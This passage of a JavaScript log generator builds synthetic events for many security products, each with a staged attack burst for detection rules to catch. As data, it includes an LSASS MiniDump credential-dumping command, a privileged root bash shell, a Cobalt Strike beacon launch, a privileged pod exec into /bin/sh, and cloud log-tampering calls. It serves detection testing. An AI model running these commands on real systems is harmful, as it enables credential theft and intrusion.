        }
        // auid is the original login identity and survives su/sudo. auid=1000 with
        // uid=0 means an unprivileged login is now executing as root.
        const serial = rand.int(1000, 9999), pid = rand.int(10000, 30000);
        const at = Date.now();
        evs.push(Object.assign(base(), {
          severity: 3, auditType: 'SYSCALL', auditSerial: serial, auditTs: at, auid: 1000, uid: 0, comm: 'bash',
          auditBody: `arch=c000003e syscall=59 success=yes exit=0 ppid=${rand.int(1000, 9999)} pid=${pid} auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 tty=pts1 ses=3 comm="bash" exe="/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="rootshell"`,
          message: 'SYSCALL execve comm="bash" auid=1000 uid=0 key="rootshell"',
        }));
        evs.push(Object.assign(base(), {
          severity: 3, auditType: 'EXECVE', auditSerial: serial, auditTs: at,
          auditBody: 'argc=3 a0="bash" a1="-i" a2="-p"',
          message: 'EXECVE bash -i -p',
        }));
        return evs;
      },
    },
    ciscoios: {
      label: 'Cisco IOS (switch/router)', category: 'appliance',
      build() {
        const host = rand.pick(['SW-CORE-01', 'RTR-EDGE-02', 'SW-ACCESS-3850']);
        const hostIp = `10.0.0.${rand.int(2, 30)}`;
        let seq = rand.int(100000, 900000);
        const base = () => ({
          srcType: 'ciscoios', vendor: 'ciscoios', host, hostIp,
          facility: FACILITY.local7, program: 'ios', seq: seq++,
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          const intf = `GigabitEthernet0/${rand.int(1, 24)}`;
          const up = rand.chance(0.6);
          evs.push(Object.assign(base(), {
            severity: 5, iosFacility: 'LINEPROTO', mnemonic: 'UPDOWN',
            message: `Line protocol on Interface ${intf}, changed state to ${up ? 'up' : 'down'}`,
          }));
        }
        evs.push(Object.assign(base(), {
          severity: 5, iosFacility: 'SYS', mnemonic: 'CONFIG_I', user: 'netops', srcIp: rand.internalIp(),
          message: 'Configured from console by netops on vty0 (10.10.1.40)',
        }));
        // An ACL stripped off the edge interface, by an account that authenticated
        // from a threat-intel address. net-config-change alerts once.
        const a = rand.pick(THREAT_INTEL.ips);
        evs.push(Object.assign(base(), {
          severity: 5, iosFacility: 'SEC_LOGIN', mnemonic: 'LOGIN_SUCCESS', user: 'admin', srcIp: a,
          message: `Login Success [user: admin] [Source: ${a}] [localport: 22]`,
        }));
        evs.push(Object.assign(base(), {
          severity: 5, iosFacility: 'SYS', mnemonic: 'CONFIG_I', user: 'admin', srcIp: a,
          message: `Configured from vty0 (${a}) by admin: no ip access-group INBOUND_FILTER in`,
        }));
        return evs;
      },
    },
    meraki: {
      label: 'Cisco Meraki (MX)', category: 'appliance',
      build() {
        const host = rand.pick(['MX250-HQ', 'MX68-BRANCH', 'MX84-DC']);
        const mac = () => Array.from({ length: 6 }, () => rand.hex(2).toUpperCase()).join(':');
        const clientMac = mac();
        const base = () => ({ srcType: 'meraki', vendor: 'meraki', host, facility: FACILITY.local1, program: 'meraki' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip();
          const sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53]);
          evs.push(Object.assign(base(), {
            severity: 6, merakiType: 'flows', srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, proto: 'tcp',
            merakiFields: [`src=${src}`, `dst=${dst}`, `mac=${clientMac}`, 'protocol=tcp',
              `sport=${sport}`, `dport=${dport}`, 'pattern:', 'allow', 'all'],
            message: `flows allow ${src}:${sport} -> ${dst}:${dport}`,
          }));
        }
        const src = rand.internalIp(), u = rand.pick(URLS);
        evs.push(Object.assign(base(), {
          severity: 6, merakiType: 'urls', srcIp: src, dstIp: rand.ip(), url: u,
          merakiFields: [`src=${src}:${rand.int(1024, 65535)}`, `dst=${rand.ip()}:80`, `mac=${clientMac}`,
            'request:', 'GET', `http://intranet.corp.local${u}`],
          message: `urls GET http://intranet.corp.local${u}`,
        }));
        // Meraki's IDS is Snort under the hood, so the alert carries a Snort SID.
        const ids = rand.pick([
          ['1:2018358:10', 'MALWARE-CNC Win.Trojan.Emotet outbound connection'],
          ['1:45148:1', 'BROWSER-IE Microsoft Internet Explorer Array out of bounds write attempt'],
          ['1:58722:2', 'SERVER-OTHER Apache Log4j logging remote code execution attempt'],
        ]);
        const bad = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, merakiType: 'security_event ids_alerted',
          srcIp: bad, dstIp: vic, srcPort: 80, dstPort: rand.int(1024, 65535), proto: 'tcp',
          threatSig: ids[1], threatSev: 'high',
          merakiFields: [`signature=${ids[0]}`, 'priority=1', `timestamp=${(Date.now() / 1000).toFixed(6)}`,
            `dhost=${clientMac}`, 'direction=ingress', 'protocol=tcp/ip',
            `src=${bad}:80`, `dst=${vic}:${rand.int(1024, 65535)}`, 'message:', ids[1]],
          message: `security_event ids_alerted ${ids[1]}`,
        }));
        return evs;
      },
    },
    citrix: {
      label: 'Citrix NetScaler (Gateway)', category: 'appliance',
      build() {
        const host = rand.pick(['ns-gw-01', 'netscaler-vpx-02']);
        const nsip = `10.0.0.${rand.int(40, 60)}`;
        const vip = `203.0.113.${rand.int(10, 90)}`;
        let msgId = rand.int(30000, 99000);
        const base = () => ({
          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip,
          facility: FACILITY.local0, program: 'ns', nsMsgId: msgId++,
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          const u = rand.pick(USERS), ip = rand.ip();
          evs.push(Object.assign(base(), {
            severity: 6, nsModule: 'SSLVPN', nsEvent: 'LOGIN', user: u, srcIp: ip,
            message: `Context ${u}@${ip} - SessionId: ${rand.int(1000, 9999)} - User ${u} - Client_ip ${ip} ` +
              `- Nat_ip "Mapped Ip" - Vserver ${vip}:443 - Browser_type "Mozilla/5.0" - SSLVPN_client_type ICA - Group(s) "Staff"`,
          }));
        }
        // Credential stuffing against the Gateway: many accounts, one source, one
        // password. vpn-brute correlates the burst and alerts once.
        const a = rand.pick(THREAT_INTEL.ips);
        ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_vpn', 'administrator', 'guest'].forEach((u) => {
          evs.push(Object.assign(base(), {
            severity: 4, nsModule: 'AAA', nsEvent: 'LOGIN_FAILED', user: u, srcIp: a,
            message: `User ${u} - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 ` +
              `- Browser_type "python-requests/2.31.0" - Failure_reason "External authentication server denied access"`,
          }));
        });
        return evs;
      },
    },
    squid: {
      label: 'Squid (proxy)', category: 'appliance',
      build() {
        const host = 'proxy-01';
        const pid = rand.int(1000, 9000);
        const base = () => ({
          srcType: 'squid', vendor: 'squid', host, hostIp: '10.10.0.8',
          facility: FACILITY.local6, program: 'squid', pid,
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const src = rand.internalIp(), dom = rand.pick(DOMAINS);
          evs.push(Object.assign(base(), {
            severity: 6, srcIp: src, method: 'GET', url: `http://${dom}${rand.pick(URLS)}`,
            squidCode: rand.pick(['TCP_MISS', 'TCP_HIT', 'TCP_REFRESH_MODIFIED']), status: 200,
            bytes: rand.int(400, 90000), elapsed: rand.int(2, 400),
            user: rand.pick(USERS), peerStatus: 'DIRECT', peerHost: dom, contentType: 'text/html',
            message: `TCP_MISS/200 GET http://${dom}${rand.pick(URLS)}`,
          }));
        }
        // A CONNECT to a Tor entry guard on 9001 — the proxy allowed it, and the
        // covert-c2 rule is what notices. One alert for the burst.
        const src = rand.internalIp();
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          const guard = `${rand.int(1, 223)}.${rand.int(0, 255)}.${rand.int(0, 255)}.${rand.int(1, 254)}`;
          evs.push(Object.assign(base(), {
            severity: 4, srcIp: src, method: 'CONNECT', url: `${guard}:9001`,
            squidCode: 'TCP_TUNNEL', status: 200, bytes: rand.int(40000, 900000),
            elapsed: rand.int(40000, 200000), user: rand.pick(USERS),
            peerStatus: 'DIRECT', peerHost: guard, contentType: '-', torExit: true,
            message: `TCP_TUNNEL/200 CONNECT ${guard}:9001`,
          }));
        }
        return evs;
      },
    },
    esxi: {
      label: 'VMware ESXi', category: 'appliance',
      build() {
        const host = rand.pick(['esxi-01.corp.local', 'esxi-04.corp.local']);
        const base = (daemon, sub) => ({
          srcType: 'esxi', vendor: 'esxi', host, hostIp: `10.10.4.${rand.int(10, 40)}`,
          facility: FACILITY.local4, program: daemon, daemon, esxSub: sub,
          pid: rand.int(200000, 2999999), opId: rand.hex(8), user: 'root', esxLevel: 'info',
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          const vm = rand.pick(['SRV-DB-01', 'SRV-APP-02', 'SRV-FILE-03']);
          evs.push(Object.assign(base('Hostd', 'Vimsvc.ha-eventmgr'), {
            severity: 6, user: 'vpxuser',
            message: `Event ${rand.int(900000, 999999)} : ${vm} on ${host} in ha-datacenter is powered on`,
          }));
        }
        evs.push(Object.assign(base('Vpxa', 'vpxavpxaInvtHost'), {
          severity: 6, user: 'vpxuser',
          message: `Completed host inventory sync, took ${rand.int(20, 900)} ms`,
        }));
        // Ransomware crews turn on SSH and drop lockdown mode before encrypting
        // datastores — hypervisor-threat alerts once on the burst.
        const a = rand.pick(THREAT_INTEL.ips);
        evs.push(Object.assign(base('Hostd', 'Vimsvc.ha-eventmgr'), {
          severity: 4, esxLevel: 'warning', srcIp: a,
          message: `Event ${rand.int(900000, 999999)} : SSH session was opened for 'root@${a}'`,
        }));
        evs.push(Object.assign(base('Hostd', 'Hostsvc.HostAccessManager'), {
          severity: 4, esxLevel: 'warning', srcIp: a,
          message: `Event ${rand.int(900000, 999999)} : Lockdown mode disabled for the host by root@${a}`,
        }));
        return evs;
      },
    },
    suricata: {
      label: 'Suricata (EVE JSON)', category: 'appliance',
      build() {
        const host = 'ids-sensor-02';
        const pid = rand.int(1000, 9000);
        const base = (type) => ({
          srcType: 'suricata', vendor: 'suricata', host, hostIp: '10.0.0.11',
          facility: FACILITY.local2, program: 'suricata', pid, eveType: type,
          flowId: rand.int(1e14, 9e14), iface: 'eth0',
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip();
          evs.push(Object.assign(base('flow'), {
            severity: 6, srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535),
            dstPort: rand.pick([443, 80]), proto: 'TCP', appProto: 'tls',
            pktsOut: rand.int(6, 90), pktsIn: rand.int(6, 120),
            bytesOut: rand.int(600, 40000), bytesIn: rand.int(600, 90000), flowState: 'closed',
            message: `flow ${src} -> ${dst} tls closed`,
          }));
        }
        const sig = rand.pick([
          [2018358, 'ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1', 'Potentially Bad Traffic', 2],
          [2025644, 'ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)', 'Attempted Administrator Privilege Gain', 1],
          [2027865, 'ET MALWARE Cobalt Strike Beacon Observed', 'A Network Trojan was detected', 1],
          [2019401, 'ET POLICY SMB2 NT Create AndX Request For an Executable File', 'Potential Corporate Privacy Violation', 2],
        ]);
        const bad = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
        evs.push(Object.assign(base('alert'), {
          severity: 2, srcIp: bad, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443,
          proto: 'TCP', appProto: 'http', action: 'blocked', gid: 1, sid: sig[0], rev: 3,
          sigName: sig[1], classification: sig[2], priority: sig[3],
          threatSig: sig[1], threatSev: sig[3] === 1 ? 'critical' : 'high',
          message: `alert ${sig[1]}`,
        }));
        return evs;
      },
    },
    sysmon: {
      // Sysmon writes to its own Windows event channel; NXLog (or Snare) is what
      // relays it, so this source declares transport 'agent'.
      label: 'Sysmon (Windows)', category: 'appliance', transport: 'agent',
      build() {
        const h = rand.pick(HOSTS.windows);
        const evs = [];
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          const exe = rand.pick(['chrome.exe', 'Teams.exe', 'OUTLOOK.EXE', 'Code.exe']);
          evs.push(sym(h, 6, 1, 'Process Create', {
            image: `C:\\Program Files\\${exe}`,
            sysmonFields: [`CommandLine="C:\\Program Files\\${exe}"`,
              'ParentImage="C:\\Windows\\explorer.exe"', 'IntegrityLevel="Medium"',
              `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
            message: `Process Create: ${exe}`,
          }));
        }
        const dst = rand.ip();
        evs.push(sym(h, 6, 3, 'Network connect', {
          image: 'C:\\Program Files\\chrome.exe',
          srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 443,
          sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
            'DestinationPort=443', 'Initiated="true"'],
          message: `Network connect: chrome.exe ${h.ip} -> ${dst}:443`,
        }));
        evs.push(sym(h, 6, 11, 'File created', {
          image: 'C:\\Program Files\\OUTLOOK.EXE',
          sysmonFields: [`TargetFilename="C:\\Users\\${rand.pick(USERS)}\\AppData\\Local\\Temp\\att${rand.int(100, 999)}.tmp"`],
          message: 'File created: AppData\\Local\\Temp attachment cache',
        }));
        // One handle request into LSASS with dump-capable rights closes the burst
        // — the cred-dumping rule alerts once on it.
        evs.push(sym(h, 2, 10, 'Process accessed', {
          image: 'C:\\Windows\\System32\\rundll32.exe',
          sysmonFields: ['SourceImage="C:\\Windows\\System32\\rundll32.exe"',
            'TargetImage="C:\\Windows\\System32\\lsass.exe"', 'GrantedAccess="0x1438"',
            'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C"'],
          message: 'Process accessed: rundll32.exe -> C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1438',
        }));
        return evs;
      },
    },
    zeek: {
      // Zeek writes log files, not syslog — Filebeat or rsyslog imfile ships
      // them, so this source declares transport 'agent'.
      label: 'Zeek (NSM)', category: 'appliance', transport: 'agent',
      build() {
        const host = 'zeek-sensor-01';
        const base = (path) => ({
          srcType: 'zeek', vendor: 'zeek', host, facility: FACILITY.local3, program: 'zeek',
          zeekPath: path, uid: `C${rand.id()}${rand.id().slice(0, 4)}`, severity: 6,
        });
        const evs = [];
        const victim = rand.internalIp();
        // Benign conn.log flows. Field order is Zeek's own:
        // ts uid orig_h orig_p resp_h resp_p proto service duration orig_bytes
        // resp_bytes conn_state local_orig local_resp missed_bytes history
        // orig_pkts orig_ip_bytes resp_pkts resp_ip_bytes
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53]);
          const ob = rand.int(400, 9000), rb = rand.int(600, 90000), pkts = rand.int(6, 60);
          evs.push(Object.assign(base('conn'), {
            srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport, proto: 'tcp',
            zeekFields: [src, String(rand.int(1024, 65535)), dst, String(dport), 'tcp',
              dport === 443 ? 'ssl' : (dport === 53 ? 'dns' : 'http'),
              rand.float(0.2, 12).toFixed(6), String(ob), String(rb), 'SF', 'T', 'F', '0',
              'ShADadFf', String(pkts), String(ob + pkts * 40), String(pkts), String(rb + pkts * 40)],
            message: `conn ${src} -> ${dst}:${dport} tcp SF ${ob}/${rb} bytes`,
          }));
        }
        // dns.log: ts uid orig_h orig_p resp_h resp_p proto trans_id rtt query
        // qclass_name qtype_name rcode_name answers
        const q = rand.pick(DOMAINS);
        evs.push(Object.assign(base('dns'), {
          srcIp: victim, dstIp: '10.10.0.53', srcPort: rand.int(1024, 65535), dstPort: 53, proto: 'udp', domain: q,
          zeekFields: [victim, String(rand.int(1024, 65535)), '10.10.0.53', '53', 'udp',
            String(rand.int(1000, 65535)), rand.float(0.001, 0.09).toFixed(6), q,
            'C_INTERNET', 'A', 'NOERROR', rand.ip()],
          message: `dns ${victim} query ${q} A NOERROR`,
        }));
        // A beacon: same internal host to one known-bad IP, near-identical byte
        // counts at a fixed cadence. c2-beacon alerts once on the pair.
        const c2 = rand.pick(THREAT_INTEL.ips), sport = rand.int(40000, 60000);
        for (let i = 0, n = rand.int(4, 6); i < n; i++) {
          const ob = 281 + rand.int(0, 6), rb = 1140 + rand.int(0, 12);
          evs.push(Object.assign(base('conn'), {
            severity: 4, srcIp: victim, dstIp: c2, srcPort: sport + i, dstPort: 443, proto: 'tcp',
            zeekFields: [victim, String(sport + i), c2, '443', 'tcp', 'ssl',
              (60 + rand.float(-0.4, 0.4)).toFixed(6), String(ob), String(rb), 'SF', 'T', 'F', '0',
              'ShADadFf', '9', String(ob + 360), '9', String(rb + 360)],
            message: `conn ${victim} -> ${c2}:443 tcp SF ${ob}/${rb} bytes (60s interval)`,
          }));
        }
        // ssl.log: ts uid orig_h orig_p resp_h resp_p version cipher server_name
        // established ja3 ja3s — the JA3 is Cobalt Strike's default profile.
        evs.push(Object.assign(base('ssl'), {
          severity: 4, srcIp: victim, dstIp: c2, srcPort: sport, dstPort: 443, proto: 'tcp',
          zeekFields: [victim, String(sport), c2, '443', 'TLSv12',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', rand.pick(THREAT_INTEL.domains), 'T',
            'a0e9f5d64349fb13191bc781f81f42e1', 'ae4edc6faf64d08308082ad26be60767'],
          message: `ssl ${victim} -> ${c2}:443 TLSv12 ja3=a0e9f5d64349fb13191bc781f81f42e1`,
        }));
        return evs;
      },
    },
    cloudtrail: {
      // AWS emits no syslog: CloudTrail records land in S3 / EventBridge and a
      // connector re-emits them, so this source declares transport 'api'.
      label: 'AWS CloudTrail', category: 'appliance', transport: 'api',
      build() {
        const user = rand.pick(['jdoe', 'asmith', 'svc_deploy', 'mchen']);
        const region = rand.pick(['us-east-1', 'eu-west-1', 'ap-southeast-2']);
        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${user}`;
        const evs = [];
        const benign = [
          ['ec2.amazonaws.com', 'DescribeInstances'], ['s3.amazonaws.com', 'ListBuckets'],
          ['sts.amazonaws.com', 'GetCallerIdentity'], ['logs.amazonaws.com', 'DescribeLogGroups'],
        ];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const call = rand.pick(benign);
          evs.push(aws({ severity: 6, region, user, arn, readOnly: true, srcIp: rand.internalIp(),
            eventSource: call[0], eventName: call[1],
            message: `${call[1]} on ${call[0]} by ${user} (success)` }));
        }
        // One control-plane abuse closes the burst, so cloud-threat alerts once.
        const bad = rand.pick([
          () => ({ eventSource: 'cloudtrail.amazonaws.com', eventName: 'StopLogging',
            requestParameters: { name: `arn:aws:cloudtrail:${region}:${AWS_ACCOUNT}:trail/org-audit-trail` },
            message: `StopLogging on org-audit-trail by ${user}` }),
          () => ({ eventName: 'CreateAccessKey', requestParameters: { userName: 'backup-svc' },
            responseElements: { accessKey: { accessKeyId: `AKIA${rand.hex(16).toUpperCase()}`, userName: 'backup-svc', status: 'Active' } },
            message: `CreateAccessKey for backup-svc by ${user}` }),
          () => ({ eventSource: 's3.amazonaws.com', eventName: 'PutBucketAcl',
            requestParameters: { bucketName: 'corp-finance-reports', 'x-amz-acl': 'public-read',
              AccessControlPolicy: { Grantee: 'http://acs.amazonaws.com/groups/global/AllUsers', Permission: 'READ' } },
            message: `PutBucketAcl public-read on corp-finance-reports by ${user}` }),
          () => ({ eventName: 'AttachUserPolicy',
            requestParameters: { userName: 'backup-svc', policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' },
            message: `AttachUserPolicy AdministratorAccess to backup-svc by ${user}` }),
        ])();
        evs.push(aws(Object.assign({ severity: 3, region, user, arn, srcIp: rand.pick(THREAT_INTEL.ips) }, bad)));
        return evs;
      },
    },
    okta: {
      // Okta ships nothing over syslog — the System Log is polled from
      // /api/v1/logs by a connector, so this source declares transport 'api'.
      label: 'Okta System Log', category: 'appliance', transport: 'api',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
        const name = who.split('@')[0];
        const evs = [];
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          const t = rand.pick(['user.session.start', 'app.oauth2.as.consent.grant', 'user.authentication.sso']);
          evs.push(Object.assign(idp({ user: who, displayName: name, oktaEventType: t,
            displayMessage: t === 'user.session.start' ? 'User login to Okta' : 'User single sign on to app',
            srcIp: rand.ip(), oktaTarget: [{ id: `0oa${rand.id()}`, type: 'AppInstance', displayName: rand.pick(['Salesforce', 'Workday', 'AWS SSO']) }],
            message: `${t} SUCCESS ${who} from ${GEO.sydney.city}/${GEO.sydney.country}` }), GEO.sydney));
        }
        // Push-bombing burst against one account — no signature to match, so the
        // mfa-fatigue rule counts the rejections and alerts once.
        const a = rand.pick(THREAT_INTEL.ips), geo = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
        for (let i = 0, n = rand.int(7, 10); i < n; i++) {
          evs.push(Object.assign(idp({ user: who, displayName: name, severity: 4, oktaSeverity: 'WARN',
            oktaEventType: 'user.authentication.auth_via_mfa', factor: 'push', credType: 'OTP',
            outcome: 'FAILURE', outcomeReason: 'FAILED_PUSH_VERIFY_REJECTED', srcIp: a, isProxy: true,
            displayMessage: 'Authentication of user via MFA',
            message: `user.authentication.auth_via_mfa FAILURE push rejected ${who} from ${geo.city}/${geo.country}` }), geo));
        }
        return evs;
      },
    },
    entra: {
      // Entra ID sign-in logs leave the tenant through Graph or an Event Hub —
      // there is no syslog listener, so this source declares transport 'api'.
      label: 'Microsoft Entra ID', category: 'appliance', transport: 'api',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
        const base = () => ({
          srcType: 'entra', vendor: 'entra', host: 'entra-connector-01', facility: FACILITY.local6,
          program: 'entra_signin', severity: 6, tenantId: ENTRA_TENANT, eventUuid: rand.uuid(),
          actorId: rand.uuid(), user: who, displayName: who.split('@')[0],
          clientOs: 'Windows 10', browser: 'Edge 126.0.0', errorCode: 0, resultDescription: null,
          caStatus: 'success', riskLevel: 'none', riskDetail: 'none', riskState: 'none',
          authRequirement: 'multiFactorAuthentication', compliant: true,
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          evs.push(Object.assign(base(), {
            appName: rand.pick(['Office 365 Exchange Online', 'Microsoft Teams', 'Azure Portal']),
            appId: rand.uuid(), clientApp: 'Browser', srcIp: rand.ip(),
            city: 'Sydney', countryCode: 'AU', lat: -33.86, lon: 151.21,
            message: `Sign-in SUCCESS ${who} via Browser from Sydney/AU (CA success, MFA satisfied)`,
          }));
        }
        // Legacy protocols predate modern auth: they cannot do MFA and Conditional
        // Access reports notApplied. A success here is an MFA bypass.
        const a = rand.pick(THREAT_INTEL.ips);
        evs.push(Object.assign(base(), {
          severity: 4, appName: 'Office 365 Exchange Online', appId: rand.uuid(),
          clientApp: rand.pick(['IMAP4', 'POP3', 'SMTP Auth', 'Other clients']),
          srcIp: a, interactive: false, compliant: false,
          caStatus: 'notApplied', riskLevel: 'high', riskDetail: 'unfamiliarFeatures', riskState: 'atRisk',
          authRequirement: 'singleFactorAuthentication',
          city: 'Moscow', countryCode: 'RU', lat: 55.75, lon: 37.61,
          message: `Sign-in SUCCESS ${who} via legacy client from Moscow/RU (CA notApplied, single-factor)`,
        }));
        return evs;
      },
    },
    crowdstrike: {
      // Falcon detections are read from the Event Streams API by the SIEM
      // connector — nothing reaches a collector on its own, hence 'api'.
      label: 'CrowdStrike Falcon', category: 'appliance', transport: 'api',
      build() {
        const h = rand.pick(HOSTS.windows);
        const sensorId = rand.hex(32);
        let offset = rand.int(1000000, 9000000);
        const base = () => ({
          srcType: 'crowdstrike', vendor: 'crowdstrike', host: h.name, hostIp: h.ip,
          facility: FACILITY.local5, program: 'falcon_siem', customerId: rand.hex(32),
          sensorId, offset: offset++, user: rand.pick(USERS),
        });
        const evs = [];
        // An EDR emits verdicts, not raw telemetry — the quiet ones are still
        // detections, just low severity and already handled.
        const low = [
          ['NGAV', 'Suspicious Activity', 'choice.exe', 'choice /m sample_detection', 'Machine Learning', 'Sensor-based ML', 2, 'Low'],
          ['PUP', 'Potentially Unwanted Program', 'toolbar_setup.exe', 'toolbar_setup.exe /S', 'Malware', 'Adware', 3, 'Medium'],
        ];
        for (const l of low) {
          evs.push(Object.assign(base(), {
            severity: 5, detectName: l[1], detectDesc: `${l[1]} detected on ${h.name}`,
            fileName: l[2], filePath: '\\Device\\HarddiskVolume2\\Users\\Public',
            cmdLine: l[3], csTactic: l[4], csTechnique: l[5], csObjective: 'Falcon Detection Method',
            csSeverity: l[6], csSeverityName: l[7], sha256: rand.hex(64),
            parentImage: '\\Device\\HarddiskVolume2\\Windows\\explorer.exe',
            disposition: 'Prevention, process blocked.',
            message: `${l[1]} — ${l[2]} (${l[7]})`,
          }));
        }
        // An EDR reports a verdict, and `message` carries only that verdict — the
        // raw command line stays in the JSON where it belongs. Keeping the two
        // apart is what stops the behavioural rules re-detecting a finding the
        // sensor has already made and blocked.
        const det = rand.pick([
          ['Credential Theft', 'Credential Access', 'OS Credential Dumping', 'rundll32.exe',
            'rundll32.exe comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\out.dmp full'],
          ['Malicious File Blocked', 'Impact', 'Data Encrypted for Impact', 'encryptor.exe',
            'encryptor.exe --path \\\\fileserver\\share --threads 8'],
          ['Cobalt Strike Beacon', 'Command and Control', 'Application Layer Protocol', 'rundll32.exe',
            'rundll32.exe C:\\ProgramData\\beacon.dll,Start'],
        ]);
        evs.push(Object.assign(base(), {
          severity: 2, detectName: det[0], detectDesc: `${det[0]} blocked on ${h.name}`,
          fileName: det[3], filePath: '\\Device\\HarddiskVolume2\\Windows\\System32',
          cmdLine: det[4], csTactic: det[1], csTechnique: det[2], csObjective: 'Falcon Detection Method',
          csSeverity: 9, csSeverityName: 'Critical', sha256: rand.hex(64),
          parentImage: '\\Device\\HarddiskVolume2\\Windows\\System32\\cmd.exe',
          disposition: 'Prevention, process killed.',
          threatSig: `${det[0]} (${det[2]})`, threatSev: 'critical',
          message: `${det[0]} — ${det[3]} killed (Critical)`,
        }));
        return evs;
      },
    },
    k8saudit: {
      // The API server writes audit events to a file or webhook; a collector
      // reads them. Nothing speaks syslog, so this source declares 'api'.
      label: 'Kubernetes audit', category: 'appliance', transport: 'api',
      build() {
        const base = () => ({
          srcType: 'k8saudit', vendor: 'k8saudit', host: 'k8s-apiserver-01', hostIp: '10.20.0.10',
          facility: FACILITY.local6, program: 'kube-apiserver', severity: 6,
          eventUuid: rand.uuid(), status: 200, rbacDecision: 'allow',
          userAgent: rand.pick(['kubectl/v1.30.2', 'argocd-application-controller/v2.11']),
        });
        const evs = [];
        const ns = rand.pick(['production', 'payments', 'default']);
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          const verb = rand.pick(['get', 'list', 'watch']);
          evs.push(Object.assign(base(), {
            verb, k8sResource: rand.pick(['pods', 'services', 'configmaps']), namespace: ns,
            objectName: `app-${rand.id().slice(0, 5)}`, srcIp: rand.internalIp(),
            user: 'system:serviceaccount:argocd:argocd-application-controller',
            auditLevel: 'Metadata', requestUri: `/api/v1/namespaces/${ns}/pods`,
            message: `${verb} pods in ${ns} — allowed`,
          }));
        }
        // A privileged pod with the host filesystem mounted is a container escape
        // in one manifest. k8s-threat alerts once.
        const a = rand.pick(THREAT_INTEL.ips);
        evs.push(Object.assign(base(), {
          severity: 3, verb: 'create', k8sResource: 'pods', namespace: ns, objectName: 'debug-shell',
          srcIp: a, user: 'system:anonymous', groups: ['system:unauthenticated'],
          userAgent: 'kubectl/v1.30.2', status: 201, privileged: true,
          requestUri: `/api/v1/namespaces/${ns}/pods`,
          rbacReason: 'RBAC: allowed by ClusterRoleBinding "cluster-admin-binding"',
          message: `create pods/debug-shell in ${ns} — privileged:true hostPID:true hostPath:/ mounted, by system:anonymous`,
        }));
        evs.push(Object.assign(base(), {
          severity: 3, verb: 'create', k8sResource: 'pods/exec', namespace: ns, objectName: 'debug-shell',
          srcIp: a, user: 'system:anonymous', groups: ['system:unauthenticated'], status: 101,
          requestUri: `/api/v1/namespaces/${ns}/pods/debug-shell/exec?command=%2Fbin%2Fsh&stdin=true&tty=true`,
          message: `create pods/exec into debug-shell in ${ns} — /bin/sh, by system:anonymous`,
        }));
        return evs;
      },
    },
    ciscoesa: {
      label: 'Cisco Secure Email (ESA)', category: 'appliance',
      build() {
        const host = rand.pick(['esa-01', 'esa-mx-02']);
        const serial = `${rand.hex(12).toUpperCase()}-${rand.hex(6).toUpperCase()}`;
        const base = () => ({
          srcType: 'ciscoesa', vendor: 'ciscoesa', host, serial, facility: FACILITY.mail,
          program: 'esa-sll', proto: 'tcp', dstPort: 25,
          spf: 'Pass', dmarc: 'Pass', asVerdict: 'NEGATIVE', avVerdict: 'CLEAN', ampVerdict: 'CLEAN',
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const from = `${rand.pick(USERS)}@${rand.pick(['partner.io', 'supplier.example', 'news.example'])}`;
          const mid = rand.int(100000000, 999999999);
          const to = `${rand.pick(USERS)}@corp.example`;
          evs.push(Object.assign(base(), {
            severity: 6, mid, icid: rand.int(10000000, 99999999),
            dcid: rand.int(1000000, 9999999), srcIp: rand.ip(), mailFrom: from, friendlyFrom: from,
            rcptTo: to, subject: rand.pick(['Q3 invoice', 'Meeting notes', 'Renewal reminder']),
            finalAction: 'DELIVERED',
            message: `MID ${mid} delivered from ${from} to ${to}`,
          }));
        }
        // Credential-phish with a weaponised attachment closes the burst — the
        // gateway's own verdicts are what the phishing rule reads.
        const lure = rand.pick([
          ['Payment remittance advice', 'remittance_advice.iso'],
